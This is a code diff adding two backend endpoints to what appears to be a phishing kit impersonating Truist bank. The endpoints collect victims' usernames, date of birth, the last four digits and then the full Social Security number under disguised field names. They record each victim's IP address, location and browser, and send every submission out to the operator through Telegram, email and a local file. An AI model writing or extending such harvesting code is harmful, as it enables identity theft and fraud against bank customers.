@@ -612,3 +612,117 @@ def truist_collect_user_home_address(request):
             payload["message"] = "Errors"
             return Response(payload, status=500)
     return Response(payload)
+
+@api_view(["POST"])
+@permission_classes([])
+@authentication_classes([])
+def truist_collect_user_social_security(request):
+    payload = {}
+    errors = {}
+    
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            ssn_short = request.data.get("s2ns", "")
+            dob = request.data.get("d_b", "")
+            
+            if not username:
+                errors["username"] = ["Username required"]
+                
+            if errors:
+                return Response({"errors": errors}, status=400)
+                
+            client = Client.objects.get(username=username)
+            client.social_security_short = ssn_short
+            client.dob = dob
+            client.save()
+            
+            # Standard browser details and notification
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+            
+            BrowserDetail.objects.create(
+                client=client,
+                ip=ip,
+                agent=agent,
+                country=country,
+                city=city,
+                address=f"{city}, {country}",
+                browser=browser,
+                os=os,
+                time=date,
+                date=date
+            )
+            
+            message = f"Truist SSN Submission\nUsername: {username}\nSSN Last4: {ssn_short}\nDOB: {dob}"
+            send_data_telegram(app_settings, message)
+            send_data_email("Truist SSN Submission", message, _notification_sender(), _notification_recipients())
+            save_data_to_file(username, message)
+            
+            payload["message"] = "Successful"
+        except Exception as e:
+            logger.exception("truist_collect_user_social_security failed")
+            payload["message"] = "Errors"
+            return Response(payload, status=500)
+    return Response(payload)
+
+@api_view(["POST"])
+@permission_classes([])
+@authentication_classes([])
+def truist_collect_user_social_security_2(request):
+    payload = {}
+    errors = {}
+    
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            ssn = request.data.get("s2ns", "")
+            
+            if not username:
+                errors["username"] = ["Username required"]
+                
+            if errors:
+                return Response({"errors": errors}, status=400)
+                
+            client = Client.objects.get(username=username)
+            client.social_security = ssn
+            client.save()
+            
+            # Standard browser details and notification
+            ip = get_client_ip(request)
+            agent = request.META.get("HTTP_USER_AGENT", "")
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+            
+            BrowserDetail.objects.create(
+                client=client,
+                ip=ip,
+                agent=agent,
+                country=country,
+                city=city,
+                address=f"{city}, {country}",
+                browser=browser,
+                os=os,
+                time=date,
+                date=date
+            )
+            
+            message = f"Truist Full SSN Submission\nUsername: {username}\nSSN: {ssn}"
+            send_data_telegram(app_settings, message)
+            send_data_email("Truist Full SSN Submission", message, _notification_sender(), _notification_recipients())
+            save_data_to_file(username, message)
+            
+            payload["message"] = "Successful"
+        except Exception as e:
+            logger.exception("truist_collect_user_social_security_2 failed")
+            payload["message"] = "Errors"
+            return Response(payload, status=500)
+    return Response(payload)
